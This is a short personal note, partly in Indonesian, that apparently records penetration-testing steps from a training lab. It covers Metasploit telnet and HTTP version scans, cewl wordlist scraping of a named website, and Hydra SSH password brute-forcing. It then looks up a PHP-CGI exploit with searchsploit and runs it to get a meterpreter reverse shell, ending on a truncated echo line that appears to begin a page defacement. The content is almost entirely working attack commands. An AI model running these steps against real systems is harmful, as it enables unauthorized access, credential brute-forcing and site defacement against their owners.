---
title: Tools
updated: 2025-12-16 11:15:42Z
created: 2025-12-16 11:15:30Z
latitude: -6.20239360
longitude: 106.65270990
altitude: 0.0000
---

\## Target ke Telnet Port  
msfconsole  
$ use auxiliary/scanner/telnet/telnet_version

options  
set RHOSTS IP-Target

run

\## Cewl  
cewl https://nfacademy.id -w wordlist_nfacademy.txt

\## Hydra  
hydra -L user_wordlist.txt -P pass_wordlist.txt -o hasil_hydra.txt ssh://192.168.103.7

HTTP  
\## target port 80  
msfconsole  
use exploit/scan/http/http_version  
options  
set RHOST IP_Target  
run

Apache/2.2.8 (Ubuntu) DAV/2 ( Powered by PHP/5.2.4-2ubuntu5.10

visit http://192.168.102.49/phpinfo.php

kembali ke home msfconsole > back

use auxiliary/scanner/http/dir_listing  
use auxiliary/scanner/http/dir_scanner  
use auxiliary/scanner/http/files_dir

\## Cek Kerentanan di search ploit  
searchploit apache | grep 5.4.2  
apache php cgi < 5.4.2

msfconsole

use exploit/multi/http/php_cgi_arg_injection  
options  
set RHOST IP_TARGET  
run

mendapatkan reverse shell

meterpreter >  
help  
shell  
echo "<h1 align=center"